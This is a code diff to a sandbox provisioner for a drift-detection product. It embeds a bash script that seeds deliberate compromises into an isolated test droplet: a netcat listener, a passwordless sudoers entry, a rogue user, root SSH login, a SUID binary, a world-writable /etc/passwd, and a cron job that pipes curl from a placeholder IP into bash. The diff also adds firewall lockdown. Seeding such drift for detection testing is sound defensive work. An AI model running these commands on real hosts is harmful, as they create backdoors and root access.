@@ -20,7 +20,7 @@
  *   KMS_PROVIDER / KMS_LOCAL_SECRET — for envelope-encrypting the keypair
  */
 
-import { generateKeyPairSync, createPublicKey } from "node:crypto";
+import { generateKeyPairSync, createHash } from "node:crypto";
 import { withBypassRls, withTenantRls, schema } from "@/db";
 import { encryptKey } from "@/lib/server/secrets/envelope";
 import { eq, and, ne } from "drizzle-orm";
@@ -61,6 +61,119 @@ async function doRequest<T>(
 }
 
 // ---------------------------------------------------------------------------
+// Seed script (mirrored from scripts/sandbox-seed.sh — kept in sync manually)
+// Embedded here so the worker can inject it via cloud-init without relying on
+// the filesystem path being available inside the Docker container at runtime.
+// IMPORTANT: any ${...} shell variable references are escaped as \${...} to
+// prevent TypeScript template-literal interpolation.
+// ---------------------------------------------------------------------------
+const SANDBOX_SEED_SH = `#!/bin/bash
+# =============================================================
+#  BLACKGLASS — Sandbox automated drift seeder
+#  Non-interactive: applies one drift "scene" per invocation.
+#  Called by the sandbox worker over SSH.
+#
+#  Usage:  bash /root/sandbox/seed.sh <phase>
+#    phase 0 = clean baseline (no changes, just verifies setup)
+#    phase 1 = backdoor port listener
+#    phase 2 = sudoers escalation
+#    phase 3 = rogue user account
+#    phase 4 = sudo group membership
+#    phase 5 = sshd PermitRootLogin yes
+#    phase 6 = cron backdoor
+#    phase 7 = suid binary
+#    phase 8 = world-writable /etc/passwd
+#
+#  Phases are cumulative — each run builds on the previous.
+#  Calling phase N twice is safe (idempotent).
+# =============================================================
+
+set -euo pipefail
+
+PHASE="\${1:-0}"
+
+log() { echo "[sandbox-seed] phase=\${PHASE} $*"; }
+
+case "\$PHASE" in
+  0)
+    log "Clean baseline — verifying setup"
+    # Ensure the blackglass scan user exists and nothing extra is present
+    id blackglass &>/dev/null || useradd -r -s /usr/sbin/nologin blackglass
+    # Clean up any previous drift so baseline is clean
+    pkill -f 'ncat -lkp 4444' 2>/dev/null || true
+    rm -f /etc/sudoers.d/sandbox-backdoor 2>/dev/null || true
+    userdel -r attacker-ssh 2>/dev/null || true
+    sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config 2>/dev/null || true
+    systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || true
+    rm -f /etc/cron.d/sandbox-beacon 2>/dev/null || true
+    find /usr/local/bin -name 'sandbox-*' -delete 2>/dev/null || true
+    chmod 644 /etc/passwd 2>/dev/null || true
+    log "Clean baseline applied"
+    ;;
+
+  1)
+    log "Scene 1 — backdoor port listener on TCP 4444"
+    pkill -f 'ncat -lkp 4444' 2>/dev/null || true
+    nohup ncat -lkp 4444 </dev/null >/dev/null 2>&1 &
+    log "Port 4444 now listening (PID $!)"
+    ;;
+
+  2)
+    log "Scene 2 — sudoers privilege escalation"
+    echo 'sandbox-user ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/sandbox-backdoor
+    chmod 440 /etc/sudoers.d/sandbox-backdoor
+    log "/etc/sudoers.d/sandbox-backdoor created"
+    ;;
+
+  3)
+    log "Scene 3 — rogue user account"
+    useradd -m -s /bin/bash attacker-ssh 2>/dev/null || true
+    log "User 'attacker-ssh' added"
+    ;;
+
+  4)
+    log "Scene 4 — sudo group membership for rogue user"
+    usermod -aG sudo attacker-ssh 2>/dev/null || true
+    log "attacker-ssh added to sudo group"
+    ;;
+
+  5)
+    log "Scene 5 — sshd PermitRootLogin yes"
+    sed -i 's/^#\\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+    systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || true
+    log "sshd_config: PermitRootLogin set to yes (reloaded)"
+    ;;
+
+  6)
+    log "Scene 6 — cron backdoor"
+    echo '*/5 * * * * root curl -s http://203.0.113.0/beacon | bash' > /etc/cron.d/sandbox-beacon
+    chmod 644 /etc/cron.d/sandbox-beacon
+    log "/etc/cron.d/sandbox-beacon created"
+    ;;
+
+  7)
+    log "Scene 7 — SUID binary"
+    cp /usr/bin/id /usr/local/bin/sandbox-id
+    chmod u+s /usr/local/bin/sandbox-id
+    log "SUID binary /usr/local/bin/sandbox-id created"
+    ;;
+
+  8)
+    log "Scene 8 — world-writable /etc/passwd"
+    chmod 666 /etc/passwd
+    log "/etc/passwd set to world-writable"
+    ;;
+
+  *)
+    log "Unknown phase '\$PHASE' — nothing done"
+    exit 1
+    ;;
+esac
+
+log "Done"
+`;
+
+// ---------------------------------------------------------------------------
 // Cloud-init user-data
 // ---------------------------------------------------------------------------
 
@@ -92,11 +205,16 @@ chmod 440 /etc/sudoers.d/blackglass-scan
 DEBIAN_FRONTEND=noninteractive apt-get update -qq
 DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ncat nginx rsyslog ufw
 
-# UFW: SSH only inbound, full outbound
+# UFW: SSH only inbound; lock outbound after package install
 ufw default deny incoming
 ufw default allow outgoing
 ufw allow 22/tcp
 ufw --force enable
+# Lock down outbound now that packages are installed (cloud-init complete)
+# UFW tracks ESTABLISHED connections so existing SSH sessions are unaffected.
+ufw default deny outgoing
+ufw allow out on lo
+ufw reload || true
 
 # Disable root password auth (key-only, and only blackglass key)
 sed -i 's/^#\\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
@@ -106,7 +224,7 @@ systemctl reload ssh || true
 # Upload seed script
 mkdir -p /root/sandbox
 cat > /root/sandbox/seed.sh << 'SEEDEOF'
-SEED_PLACEHOLDER
+${SANDBOX_SEED_SH}
 SEEDEOF
 chmod +x /root/sandbox/seed.sh
 
@@ -145,7 +263,6 @@ function generateSandboxKeypair(): SandboxKeypair {
   const pubKeyOpenSsh = `ssh-ed25519 ${wire.toString("base64")} blackglass-sandbox`;
 
   // SHA-256 fingerprint of the public key wire bytes
-  const { createHash } = require("node:crypto");
   const fingerprint = createHash("sha256").update(wire).digest("hex");
 
   return { privateKeyPem, pubKeyOpenSsh, fingerprint };
@@ -320,12 +437,42 @@ export async function activateSandbox(
       .returning(),
   );
 
+  // Apply DO Cloud Firewall: inbound SSH (22) only — belt-and-suspenders on top of UFW.
+  // This ensures no attack-scenario ports (e.g. 4444 from phase 1) are reachable from
+  // the public internet even if UFW is bypassed. Outbound is unrestricted at the DO
+  // Firewall layer; the Droplet's own UFW handles egress.
+  let firewallId: string | null = null;
+  try {
+    const fw = await doRequest<{ firewall: { id: string } }>("POST", "/firewalls", {
+      name: `bg-sbx-${sandboxId.slice(0, 8)}-fw`,
+      inbound_rules: [
+        {
+          protocol: "tcp",
+          ports: "22",
+          sources: { addresses: ["0.0.0.0/0", "::/0"] },
+        },
+      ],
+      outbound_rules: [
+        { protocol: "tcp",  ports: "all", destinations: { addresses: ["0.0.0.0/0", "::/0"] } },
+        { protocol: "udp",  ports: "all", destinations: { addresses: ["0.0.0.0/0", "::/0"] } },
+        { protocol: "icmp",               destinations: { addresses: ["0.0.0.0/0", "::/0"] } },
+      ],
+      droplet_ids: [Number(sandbox.dropletId)],
+    });
+    firewallId = fw.firewall.id;
+    console.info(`[sandbox-provisioner] DO Firewall ${firewallId} attached to sandbox ${sandboxId}`);
+  } catch (err) {
+    // Non-fatal: UFW inside the Droplet still protects. Log and continue.
+    console.warn(`[sandbox-provisioner] Failed to create DO Firewall for ${sandboxId}: ${err}`);
+  }
+
   await withBypassRls((db) =>
     db
       .update(saasSandboxes)
       .set({
         dropletIp: ip,
         hostId: host.id,
+        firewallId: firewallId ?? undefined,
         status: "ready",
         updatedAt: new Date(),
       })
@@ -359,6 +506,17 @@ export async function destroySandbox(sandboxId: string): Promise<void> {
       // 404 = already gone — that's fine
       if (!(err instanceof Error && err.message.includes("404"))) {
         throw err;
+      }
+    }
+  }
+
+  // Delete associated DO Cloud Firewall
+  if (sandbox.firewallId) {
+    try {
+      await doRequest("DELETE", `/firewalls/${sandbox.firewallId}`);
+    } catch (err) {
+      if (!(err instanceof Error && err.message.includes("404"))) {
+        console.warn(`[sandbox-provisioner] Failed to delete firewall ${sandbox.firewallId}: ${err}`);
       }
     }
   }
